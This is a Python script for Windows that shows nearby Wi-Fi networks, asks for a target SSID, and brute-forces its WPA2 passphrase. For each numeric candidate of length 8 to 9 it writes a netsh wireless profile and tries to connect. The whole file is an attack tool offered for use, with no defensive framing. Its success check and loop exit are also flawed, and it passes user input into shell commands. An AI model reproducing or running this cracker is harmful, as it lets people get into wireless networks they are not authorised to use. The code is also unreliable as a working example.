import itertools
import re
import subprocess

def create_new_connection(name, SSID, password):
    config = f"""<?xml version="1.0"?>
            <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
                <name>{name}</name>
                <SSIDConfig>
                    <SSID>
                        <name>{SSID}</name>
                    </SSID>
                </SSIDConfig>
                <connectionType>ESS</connectionType>
                <connectionMode>auto</connectionMode>
                <MSM>
                    <security>
                        <authEncryption>
                            <authentication>WPA2PSK</authentication>
                            <encryption>AES</encryption>
                            <useOneX>false</useOneX>
                        </authEncryption>
                        <sharedKey>
                            <keyType>passPhrase</keyType>
                            <protected>false</protected>
                            <keyMaterial>{password}</keyMaterial>
                        </sharedKey>
                    </security>
                </MSM>
            </WLANProfile>"""

    with open(f"{name}.xml", "w") as file:
        file.write(config)

    command = f"netsh wlan add profile filename=\"{name}.xml\" interface=Wi-Fi"
    subprocess.run(command, shell=True)

def connect_to_network(name, SSID):
    command = f"netsh wlan connect name=\"{name}\" ssid=\"{SSID}\" interface=Wi-Fi"
    subprocess.run(command, shell=True)

def display_available_networks():
    command = "netsh wlan show networks interface=Wi-Fi"
    subprocess.run(command, shell=True)

def brute_force_password(SSID, char_set, min_length, max_length):
    for length in range(min_length, max_length+1):
        for attempt in itertools.product(char_set, repeat=length):
            password = "".join(attempt)
            create_new_connection(SSID, SSID, password)
            connect_to_network(SSID, SSID)
            try:
                output = subprocess.check_output(f"Netsh WLAN show interfaces", shell=True).decode("utf-8")
                if re.search(f"SSID: {SSID}", output):
                    print(f"Connected to the network: {SSID} with password: {password}")
                    break
            except subprocess.CalledProcessError:
                pass
            finally:
                connect_to_network("", "")

display_available_networks()
SSID = input("Enter the name of the network: ")
char_set = "0123456789"
min_length = 8
max_length = 9
brute_force_password(SSID, char_set, min_length, max_length)